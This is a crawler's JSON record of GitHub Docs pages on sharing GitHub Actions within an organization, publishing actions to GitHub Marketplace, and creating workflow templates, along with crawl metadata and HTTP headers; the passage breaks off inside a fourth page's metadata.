  "text": "Sharing actions and workflows with your organization\nYou can share an action or reusable workflow with your organization without publishing the action or workflow publicly.\nIn this article\nAbout GitHub Actions access to private repositories\nYou can share actions and reusable workflows within your organization, without publishing them publicly, by allowing GitHub Actions workflows to access a private repository that contains the action or reusable workflow.\nAny actions or reusable workflows stored in the private repository can be used in workflows defined in other private repositories owned by the same organization. Actions and reusable workflows stored in private repositories cannot be used in public repositories.\nWarning\nIf you make a private repository accessible to GitHub Actions workflows in other repositories, outside collaborators on the other repositories can indirectly access the private repository, even though they do not have direct access to these repositories. The outside collaborators can view logs for workflow runs when actions or workflows from the private repository are used.\nTo allow runners to download these actions, GitHub passes a scoped installation token to the runner. This token has read access to the repository, and automatically expires after one hour.\nSharing actions and workflows with your organization\nStore the action or reusable workflow in a private repository. For more information, see About repositories.\nConfigure the repository to allow access to workflows in other private repositories. For more information, see Managing GitHub Actions settings for a repository.\nFurther reading\nReusing workflows",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-sharing-automations-sharing-actions-and-workflows-with-your-organization-7hnhs.html",
  "markdown": "# Sharing actions and workflows with your organization\n\nYou can share an action or reusable workflow with your organization without publishing the action or workflow publicly.\n\n## In this article\n\n## [About GitHub Actions access to private repositories](#about-github-actions-access-to-private-repositories)\n\nYou can share actions and reusable workflows within your organization, without publishing them publicly, by allowing GitHub Actions workflows to access a private repository that contains the action or reusable workflow.\n\nAny actions or reusable workflows stored in the private repository can be used in workflows defined in other private repositories owned by the same organization. Actions and reusable workflows stored in private repositories cannot be used in public repositories.\n\nWarning\n\n*   If you make a private repository accessible to GitHub Actions workflows in other repositories, outside collaborators on the other repositories can indirectly access the private repository, even though they do not have direct access to these repositories. The outside collaborators can view logs for workflow runs when actions or workflows from the private repository are used.\n*   To allow runners to download these actions, GitHub passes a scoped installation token to the runner. This token has read access to the repository, and automatically expires after one hour.\n\n## [Sharing actions and workflows with your organization](#sharing-actions-and-workflows-with-your-organization)\n\n1.  Store the action or reusable workflow in a private repository. For more information, see [About repositories](https://docs.github.com/en/repositories/creating-and-managing-repositories/about-repositories#about-repository-visibility).\n2.  Configure the repository to allow access to workflows in other private repositories. For more information, see [Managing GitHub Actions settings for a repository](https://docs.github.com/en/repositories/managing-your-repositorys-settings-and-features/enabling-features-for-your-repository/managing-github-actions-settings-for-a-repository#allowing-access-to-components-in-a-private-repository).\n\n## [Further reading](#further-reading)\n\n*   [Reusing workflows](https://docs.github.com/en/actions/using-workflows/reusing-workflows)",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasUrlDashes",
    "totalLinks": 228,
    "response": {
      "statusCode": 200
    },
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-sharing-automations-sharing-actions-and-workflows-with-your-organization-originalHtmlUrl",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-sharing-automations-sharing-actions-and-workflows-with-your-organization-removedElementsHtmlUrl",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-sharing-automations-sharing-actions-and-workflows-with-your-organization-extractusHtmlUrl",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-sharing-automations-sharing-actions-and-workflows-with-your-organization-readableTextHtmlUrl",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-sharing-automations-sharing-actions-and-workflows-with-your-organization-readableTextIfPossibleHtmlUrl"
    },
    "lengths": {
      "extractus": 3015,
      "readableText": 2953,
      "none": 18678,
      "readableTextIfPossible": 18678,
      "result": 2953,
      "markdown": 2263
    },
    "requestHandlerMode": "browser"
  }
},
{
  "url": "https://docs.github.com/en/actions/sharing-automations/creating-actions/publishing-actions-in-github-marketplace",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/sharing-automations/creating-actions/publishing-actions-in-github-marketplace",
    "loadedTime": "2025-05-08T06:38:01.130Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1,
    "httpStatusCode": 200
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/sharing-automations/creating-actions/publishing-actions-in-github-marketplace",
    "title": "Publishing actions in GitHub Marketplace - GitHub Docs",
    "description": "You can publish actions in GitHub Marketplace and share actions you've created with the GitHub community.",
    "author": null,
    "keywords": null,
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Publishing actions in GitHub Marketplace - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/sharing-automations/creating-actions/publishing-actions-in-github-marketplace"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/sharing-automations/creating-actions/publishing-actions-in-github-marketplace"
      }
    ],
    "jsonLd": null,
    "headers": {
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "1523:84D71:C951BE:106ECBD:681C3CA9",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "5272",
      "date": "Thu, 08 May 2025 06:37:54 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-lga21934-LGA",
      "x-cache": "HIT",
      "x-cache-hits": "0",
      "x-timer": "S1746686274.211575, VS0, VE1",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600",
      "content-length": "27640",
      "x-firefox-spdy": "h2"
    }
  },
  "screenshotUrl": null,
  "text": "Publishing actions in GitHub Marketplace\nYou can publish actions in GitHub Marketplace and share actions you've created with the GitHub community.\nYou must accept the terms of service to publish actions in GitHub Marketplace.\nAbout publishing actions\nBefore you can publish an action, you'll need to create an action in your repository. For more information, see Sharing automations.\nWhen you plan to publish your action to GitHub Marketplace, you'll need to ensure that the repository only includes the metadata file, code, and files necessary for the action. Creating a single repository for the action allows you to tag, release, and package the code in a single unit. GitHub also uses the action's metadata on your GitHub Marketplace page.\nActions are published to GitHub Marketplace immediately and aren't reviewed by GitHub as long as they meet these requirements:\nThe action must be in a public repository.\nEach repository must contain a single action metadata file (action.yml or action.yaml) at the root. \nRepositories may include other actions metadata files in sub-folders, but they will not be automatically listed in the marketplace.\nEach repository must not contain any workflow files.\nThe name in the action's metadata file must be unique. \nThe name cannot match an existing action name published on GitHub Marketplace.\nThe name cannot match a user or organization on GitHub, unless the user or organization owner is publishing the action. For example, only the GitHub organization can publish an action named github.\nThe name cannot match an existing GitHub Marketplace category.\nGitHub reserves the names of GitHub features.\nPublishing an action\nYou can add the action you've created to GitHub Marketplace by tagging it as a new release and publishing it.\nTo draft a new release and publish the action to GitHub Marketplace, follow these instructions:\nOn GitHub, navigate to the main page of the repository.\nNavigate to the action metadata file in your repository (action.yml), and you'll see a banner to publish the action to GitHub Marketplace. Click Draft a release.\nUnder \"Release Action\", select Publish this Action to the GitHub Marketplace.\nNote\nThe \"Publish\" checkbox is disabled if the account that owns the repository has not yet accepted the GitHub Marketplace Developer Agreement. If you own the repository or are an organization owner, click the link to \"accept the GitHub Marketplace Developer Agreement\", then accept the agreement. If there is no link, send the organization owner a link to this \"Release Action\" page and ask them to accept the agreement.\nIf the labels in your metadata file contain any problems, you will see an error message or a warning message. Address them by updating your metadata file. Once complete, you will see an \"Everything looks good!\" message.\nSelect the Primary Category dropdown menu and click a category that will help people find your action in GitHub Marketplace.\nOptionally, select the Another Category dropdown menu and click a secondary category.\nIn the tag field, type a version for your action. This helps people know what changes or features the release includes. People will see the version in the action's dedicated GitHub Marketplace page.\nIn the title field, type a release title.\nComplete all other fields and click Publish release. Publishing requires you to use two-factor authentication. For more information, see Configuring two-factor authentication.\nRemoving an action from GitHub Marketplace\nTo remove a published action from GitHub Marketplace, you'll need to update each published release. Perform the following steps for each release of the action you've published to GitHub Marketplace.\nOn GitHub, navigate to the main page of the repository.\nTo the right of the list of files, click Releases.\nNext to the release you want to edit, click .\nSelect Publish this action to the GitHub Marketplace to remove the check from the box.\nClick Update release at the bottom of the page.\nTransferring an action repository\nYou can transfer an action repository to another user or organization. For more information, see Transferring a repository.\nWhen a repository admin transfers an action repository, GitHub automatically creates a redirect from the previous URL to the new URL, meaning workflows that use the affected action do not need to be updated.\nActions published on GitHub Marketplace are linked to a repository by their unique name identifier, meaning you can publish new releases of an action from the transferred repository under the same GitHub Marketplace listing. If an action repository is deleted, the GitHub Marketplace listing is also deleted, and the unique name identifier becomes available.\nNote\nThe \"Verified\" badge seen on an organization's GitHub profile is different from the verified creator badge on GitHub Marketplace. If you transfer an action repository, the GitHub Marketplace listing will lose the verified creator badge unless the new owner is also a verified creator.\nAbout badges in GitHub Marketplace\nActions with the , or verified creator badge, indicate that GitHub has verified the creator of the action as a partner organization. Partners can email partnerships@github.com to request the verified creator badge.",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-sharing-automations-creating-actions-publishing-actions-in-github-marketplace-drsyc.html",
  "markdown": "# Publishing actions in GitHub Marketplace\n\nYou can publish actions in GitHub Marketplace and share actions you've created with the GitHub community.\n\nYou must accept the terms of service to publish actions in GitHub Marketplace.\n\n## [About publishing actions](#about-publishing-actions)\n\nBefore you can publish an action, you'll need to create an action in your repository. For more information, see [Sharing automations](https://docs.github.com/en/actions/creating-actions).\n\nWhen you plan to publish your action to GitHub Marketplace, you'll need to ensure that the repository only includes the metadata file, code, and files necessary for the action. Creating a single repository for the action allows you to tag, release, and package the code in a single unit. GitHub also uses the action's metadata on your GitHub Marketplace page.\n\nActions are published to GitHub Marketplace immediately and aren't reviewed by GitHub as long as they meet these requirements:\n\n*   The action must be in a public repository.\n*   Each repository must contain a single action metadata file (`action.yml` or `action.yaml`) at the root.\n    *   Repositories may include other actions metadata files in sub-folders, but they will not be automatically listed in the marketplace.\n*   Each repository must _not_ contain any workflow files.\n*   The `name` in the action's metadata file must be unique.\n    *   The `name` cannot match an existing action name published on GitHub Marketplace.\n    *   The `name` cannot match a user or organization on GitHub, unless the user or organization owner is publishing the action. For example, only the GitHub organization can publish an action named `github`.\n    *   The `name` cannot match an existing GitHub Marketplace category.\n    *   GitHub reserves the names of GitHub features.\n\n## [Publishing an action](#publishing-an-action)\n\nYou can add the action you've created to GitHub Marketplace by tagging it as a new release and publishing it.\n\nTo draft a new release and publish the action to GitHub Marketplace, follow these instructions:\n\n1.  On GitHub, navigate to the main page of the repository.\n    \n2.  Navigate to the action metadata file in your repository (`action.yml`), and you'll see a banner to publish the action to GitHub Marketplace. Click **Draft a release**.\n    \n3.  Under \"Release Action\", select **Publish this Action to the GitHub Marketplace**.\n    \n    Note\n    \n    The \"Publish\" checkbox is disabled if the account that owns the repository has not yet accepted the GitHub Marketplace Developer Agreement. If you own the repository or are an organization owner, click the link to \"accept the GitHub Marketplace Developer Agreement\", then accept the agreement. If there is no link, send the organization owner a link to this \"Release Action\" page and ask them to accept the agreement.\n    \n4.  If the labels in your metadata file contain any problems, you will see an error message or a warning message. Address them by updating your metadata file. Once complete, you will see an \"Everything looks good!\" message.\n    \n5.  Select the **Primary Category** dropdown menu and click a category that will help people find your action in GitHub Marketplace.\n    \n6.  Optionally, select the **Another Category** dropdown menu and click a secondary category.\n    \n7.  In the tag field, type a version for your action. This helps people know what changes or features the release includes. People will see the version in the action's dedicated GitHub Marketplace page.\n    \n8.  In the title field, type a release title.\n    \n9.  Complete all other fields and click **Publish release**. Publishing requires you to use two-factor authentication. For more information, see [Configuring two-factor authentication](https://docs.github.com/en/authentication/securing-your-account-with-two-factor-authentication-2fa/configuring-two-factor-authentication).\n    \n\n## [Removing an action from GitHub Marketplace](#removing-an-action-from-github-marketplace)\n\nTo remove a published action from GitHub Marketplace, you'll need to update each published release. Perform the following steps for each release of the action you've published to GitHub Marketplace.\n\n1.  On GitHub, navigate to the main page of the repository.\n    \n2.  To the right of the list of files, click **Releases**.\n    \n    ![Screenshot of the main page of a repository. A link, labeled \"Releases\", is highlighted with an orange outline.](https://docs.github.com/assets/cb-90524/images/help/releases/release-link.png)\n    \n3.  Next to the release you want to edit, click .\n    \n    ![Screenshot of a release in the releases list. A pencil icon is highlighted with an orange outline.](https://docs.github.com/assets/cb-33857/images/help/releases/edit-release-pencil.png)\n    \n4.  Select **Publish this action to the GitHub Marketplace** to remove the check from the box.\n    \n5.  Click **Update release** at the bottom of the page.\n    \n\n## [Transferring an action repository](#transferring-an-action-repository)\n\nYou can transfer an action repository to another user or organization. For more information, see [Transferring a repository](https://docs.github.com/en/repositories/creating-and-managing-repositories/transferring-a-repository).\n\nWhen a repository admin transfers an action repository, GitHub automatically creates a redirect from the previous URL to the new URL, meaning workflows that use the affected action do not need to be updated.\n\nActions published on GitHub Marketplace are linked to a repository by their unique `name` identifier, meaning you can publish new releases of an action from the transferred repository under the same GitHub Marketplace listing. If an action repository is deleted, the GitHub Marketplace listing is also deleted, and the unique `name` identifier becomes available.\n\nNote\n\nThe \"Verified\" badge seen on an organization's GitHub profile is different from the verified creator badge on GitHub Marketplace. If you transfer an action repository, the GitHub Marketplace listing will lose the verified creator badge unless the new owner is also a verified creator.\n\n## [About badges in GitHub Marketplace](#about-badges-in-github-marketplace)\n\nActions with the , or verified creator badge, indicate that GitHub has verified the creator of the action as a partner organization. Partners can email [](mailto:partnerships@github.com)[partnerships@github.com](mailto:partnerships@github.com) to request the verified creator badge.\n\n![Screenshot of GitHub Actions with the verified creator badge.](https://docs.github.com/assets/cb-15807/images/marketplace/verified-creator-badge-for-actions.png)",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasUrlDashes",
    "totalLinks": 237,
    "response": {
      "statusCode": 200
    },
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-sharing-automations-creating-actions-publishing-actions-in-github-marketplace-originalHtmlUrl",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-sharing-automations-creating-actions-publishing-actions-in-github-marketplace-removedElementsHtmlUrl",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-sharing-automations-creating-actions-publishing-actions-in-github-marketplace-extractusHtmlUrl",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-sharing-automations-creating-actions-publishing-actions-in-github-marketplace-readableTextHtmlUrl",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-sharing-automations-creating-actions-publishing-actions-in-github-marketplace-readableTextIfPossibleHtmlUrl"
    },
    "lengths": {
      "extractus": 8733,
      "readableText": 8276,
      "none": 25081,
      "readableTextIfPossible": 25081,
      "result": 8276,
      "markdown": 6631
    },
    "requestHandlerMode": "browser"
  }
},
{
  "url": "https://docs.github.com/en/actions/sharing-automations/creating-workflow-templates-for-your-organization",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/sharing-automations/creating-workflow-templates-for-your-organization",
    "loadedTime": "2025-05-08T06:38:06.016Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1,
    "httpStatusCode": 200
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/sharing-automations/creating-workflow-templates-for-your-organization",
    "title": "Creating workflow templates for your organization - GitHub Docs",
    "description": "Learn how you can create workflow templates to help people in your team add new workflows more easily.",
    "author": null,
    "keywords": "Workflows,CI",
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Creating workflow templates for your organization - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/sharing-automations/creating-workflow-templates-for-your-organization"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/sharing-automations/creating-workflow-templates-for-your-organization"
      }
    ],
    "jsonLd": null,
    "headers": {
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "5A60:184E:B78262:EEAC4D:681C5144",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "0",
      "date": "Thu, 08 May 2025 06:38:00 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-lga21934-LGA",
      "x-cache": "MISS",
      "x-cache-hits": "0",
      "x-timer": "S1746686280.036624, VS0, VE203",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600",
      "content-length": "27865",
      "x-firefox-spdy": "h2"
    }
  },
  "screenshotUrl": null,
  "text": "Creating workflow templates for your organization\nLearn how you can create workflow templates to help people in your team add new workflows more easily.\nOverview\nWorkflow templates allow everyone in your organization who has permission to create workflows to do so more quickly and easily. When you create a new workflow, you can choose a workflow template and some or all of the work of writing the workflow will be done for you. You can use workflow templates as a starting place to build your custom workflow or use them as-is. This not only saves time, it promotes consistency and best practice across your organization.\nGitHub provides ready-to-use workflow templates for the following high level categories:\nDeployment (CD). For more information, see About continuous deployment with GitHub Actions.\nSecurity. For more information, see Configuring advanced setup for code scanning.\nContinuous Integration (CI). For more information, see About continuous integration with GitHub Actions.\nAutomation. Automation workflow templates offer solutions for automating workflows, such as triaging pull requests and applying a label based on the paths that are modified in the pull request, or greeting users who are first time contributors to the repository.\nNote\nBecause workflow templates require a public .github repository, they are not available for Enterprise Managed Users.\nCreating a workflow template\nWorkflow templates can be created by users with write access to the organization's public .github repository. These can then be used by organization members who have permission to create workflows.\nWorkflow templates created by users can only be used to create workflows in public repositories. Organizations using GitHub Enterprise Cloud can also use workflow templates to create workflows in private repositories. For more information, see the GitHub Enterprise Cloud documentation.\nNote\nTo avoid duplication among workflow templates you can call reusable workflows from within a workflow. This can help make your workflows easier to maintain. For more information, see Reusing workflows.\nThis procedure demonstrates how to create a workflow template and metadata file. The metadata file describes how the workflow templates will be presented to users when they are creating a new workflow.\nIf it doesn't already exist, create a new public repository named .github in your organization.\nCreate a directory named workflow-templates.\nCreate your new workflow file inside the workflow-templates directory.\nIf you need to refer to a repository's default branch, you can use the $default-branch placeholder. When a workflow is created the placeholder will be automatically replaced with the name of the repository's default branch.\nFor example, this file named octo-organization-ci.yml demonstrates a basic workflow.\nYAML\nname: Octo Organization CI on: push: branches: [ $default-branch ] pull_request: branches: [ $default-branch ] jobs: build: runs-on: ubuntu-latest steps: - uses: actions/checkout@v4 - name: Run a one-line script run: echo Hello from Octo Organization \nCreate a metadata file inside the workflow-templates directory. The metadata file must have the same name as the workflow file, but instead of the .yml extension, it must be appended with .properties.json. For example, this file named octo-organization-ci.properties.json contains the metadata for a workflow file named octo-organization-ci.yml:\nJSON\n{ \"name\": \"Octo Organization Workflow\", \"description\": \"Octo Organization CI workflow template.\", \"iconName\": \"example-icon\", \"categories\": [ \"Go\" ], \"filePatterns\": [ \"package.json$\", \"^Dockerfile\", \".*\\\\.md$\" ] } \nname - Required. The name of the workflow. This is displayed in the list of available workflows.\ndescription - Required. The description of the workflow. This is displayed in the list of available workflows.\niconName - Optional. Specifies an icon for the workflow that is displayed in the list of workflows. iconName can one of the following types:\nAn SVG file that is stored in the workflow-templates directory. To reference a file, the value must be the file name without the file extension. For example, an SVG file named example-icon.svg is referenced as example-icon.\nAn icon from GitHub's set of Octicons. To reference an octicon, the value must be octicon <icon name>. For example, octicon smiley.\ncategories - Optional. Defines the categories that the workflow is shown under. You can use category names from the following lists:\nGeneral category names from the starter-workflows repository.\nLinguist languages from the list in the linguist repository.\nSupported tech stacks from the list in the starter-workflows repository.\nfilePatterns - Optional. Allows the workflow to be used if the user's repository has a file in its root directory that matches a defined regular expression.\nTo add another workflow template, add your files to the same workflow-templates directory.\nNext steps\nTo continue learning about GitHub Actions, see Using workflow templates.",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-sharing-automations-creating-workflow-templates-for-your-organization-u67y3.html",
  "markdown": "# Creating workflow templates for your organization\n\nLearn how you can create workflow templates to help people in your team add new workflows more easily.\n\n## [Overview](#overview)\n\nWorkflow templates allow everyone in your organization who has permission to create workflows to do so more quickly and easily. When you create a new workflow, you can choose a workflow template and some or all of the work of writing the workflow will be done for you. You can use workflow templates as a starting place to build your custom workflow or use them as-is. This not only saves time, it promotes consistency and best practice across your organization.\n\nGitHub provides ready-to-use workflow templates for the following high level categories:\n\n*   **Deployment (CD)**. For more information, see [About continuous deployment with GitHub Actions](https://docs.github.com/en/actions/deployment/about-deployments/about-continuous-deployment).\n\n*   **Security**. For more information, see [Configuring advanced setup for code scanning](https://docs.github.com/en/code-security/code-scanning/creating-an-advanced-setup-for-code-scanning/configuring-advanced-setup-for-code-scanning#configuring-code-scanning-using-third-party-actions).\n\n*   **Continuous Integration (CI)**. For more information, see [About continuous integration with GitHub Actions](https://docs.github.com/en/actions/automating-builds-and-tests/about-continuous-integration).\n*   **Automation**. Automation workflow templates offer solutions for automating workflows, such as triaging pull requests and applying a label based on the paths that are modified in the pull request, or greeting users who are first time contributors to the repository.\n\nNote\n\nBecause workflow templates require a public `.github` repository, they are not available for Enterprise Managed Users.\n\n## [Creating a workflow template](#creating-a-workflow-template)\n\nWorkflow templates can be created by users with write access to the organization's _public_ `.github` repository. These can then be used by organization members who have permission to create workflows.\n\nWorkflow templates created by users can only be used to create workflows in public repositories. Organizations using GitHub Enterprise Cloud can also use workflow templates to create workflows in private repositories. For more information, see the [GitHub Enterprise Cloud documentation](https://docs.github.com/en/enterprise-cloud@latest/actions/using-workflows/creating-starter-workflows-for-your-organization).\n\nNote\n\nTo avoid duplication among workflow templates you can call reusable workflows from within a workflow. This can help make your workflows easier to maintain. For more information, see [Reusing workflows](https://docs.github.com/en/actions/using-workflows/reusing-workflows).\n\nThis procedure demonstrates how to create a workflow template and metadata file. The metadata file describes how the workflow templates will be presented to users when they are creating a new workflow.\n\n1.  If it doesn't already exist, create a new _public_ repository named `.github` in your organization.\n    \n2.  Create a directory named `workflow-templates`.\n    \n3.  Create your new workflow file inside the `workflow-templates` directory.\n    \n    If you need to refer to a repository's default branch, you can use the `$default-branch` placeholder. When a workflow is created the placeholder will be automatically replaced with the name of the repository's default branch.\n    \n    For example, this file named `octo-organization-ci.yml` demonstrates a basic workflow.\n    \n    YAML\n    \n    ```\n    name: Octo Organization CI\n    \n    on:\n      push:\n        branches: [ $default-branch ]\n      pull_request:\n        branches: [ $default-branch ]\n    \n    jobs:\n      build:\n        runs-on: ubuntu-latest\n    \n        steps:\n          - uses: actions/checkout@v4\n    \n          - name: Run a one-line script\n            run: echo Hello from Octo Organization\n    ```\n    \n4.  Create a metadata file inside the `workflow-templates` directory. The metadata file must have the same name as the workflow file, but instead of the `.yml` extension, it must be appended with `.properties.json`. For example, this file named `octo-organization-ci.properties.json` contains the metadata for a workflow file named `octo-organization-ci.yml`:\n    \n    JSON\n    \n    ```\n    {\n        \"name\": \"Octo Organization Workflow\",\n        \"description\": \"Octo Organization CI workflow template.\",\n        \"iconName\": \"example-icon\",\n        \"categories\": [\n            \"Go\"\n        ],\n        \"filePatterns\": [\n            \"package.json$\",\n            \"^Dockerfile\",\n            \".*\\\\.md$\"\n        ]\n    }\n    ```\n    \n    *   `name` - **Required.** The name of the workflow. This is displayed in the list of available workflows.\n        \n    *   `description` - **Required.** The description of the workflow. This is displayed in the list of available workflows.\n        \n    *   `iconName` - **Optional.** Specifies an icon for the workflow that is displayed in the list of workflows. `iconName` can one of the following types:\n        \n        *   An SVG file that is stored in the `workflow-templates` directory. To reference a file, the value must be the file name without the file extension. For example, an SVG file named `example-icon.svg` is referenced as `example-icon`.\n        *   An icon from GitHub's set of [Octicons](https://primer.style/octicons/). To reference an octicon, the value must be `octicon <icon name>`. For example, `octicon smiley`.\n    *   `categories` - **Optional.** Defines the categories that the workflow is shown under. You can use category names from the following lists:\n        \n        *   General category names from the [starter-workflows](https://github.com/actions/starter-workflows/blob/main/README.md#categories) repository.\n        *   Linguist languages from the list in the [linguist](https://github.com/github-linguist/linguist/blob/main/lib/linguist/languages.yml) repository.\n        *   Supported tech stacks from the list in the [starter-workflows](https://github.com/github-starter-workflows/repo-analysis-partner/blob/main/tech_stacks.yml) repository.\n    *   `filePatterns` - **Optional.** Allows the workflow to be used if the user's repository has a file in its root directory that matches a defined regular expression.\n        \n\nTo add another workflow template, add your files to the same `workflow-templates` directory.\n\n## [Next steps](#next-steps)\n\nTo continue learning about GitHub Actions, see [Using workflow templates](https://docs.github.com/en/actions/learn-github-actions/using-starter-workflows).",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasUrlDashes",
    "totalLinks": 241,
    "response": {
      "statusCode": 200
    },
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-sharing-automations-creating-workflow-templates-for-your-organization-originalHtmlUrl",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-sharing-automations-creating-workflow-templates-for-your-organization-removedElementsHtmlUrl",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-sharing-automations-creating-workflow-templates-for-your-organization-extractusHtmlUrl",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-sharing-automations-creating-workflow-templates-for-your-organization-readableTextHtmlUrl",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-sharing-automations-creating-workflow-templates-for-your-organization-readableTextIfPossibleHtmlUrl"
    },
    "lengths": {
      "extractus": 8669,
      "readableText": 8464,
      "none": 30809,
      "readableTextIfPossible": 30809,
      "result": 8464,
      "markdown": 6652
    },
    "requestHandlerMode": "browser"
  }
},
{
  "url": "https://docs.github.com/en/actions/sharing-automations/creating-actions/releasing-and-maintaining-actions",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/sharing-automations/creating-actions/releasing-and-maintaining-actions",
    "loadedTime": "2025-05-08T06:38:03.933Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1,
    "httpStatusCode": 200
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/sharing-automations/creating-actions/releasing-and-maintaining-actions",
    "title": "Releasing and maintaining actions - GitHub Docs",
    "description": "You can leverage automation and open source best practices to release and maintain actions.",
    "author": null,
    "keywords": "Action development,Actions,Community",
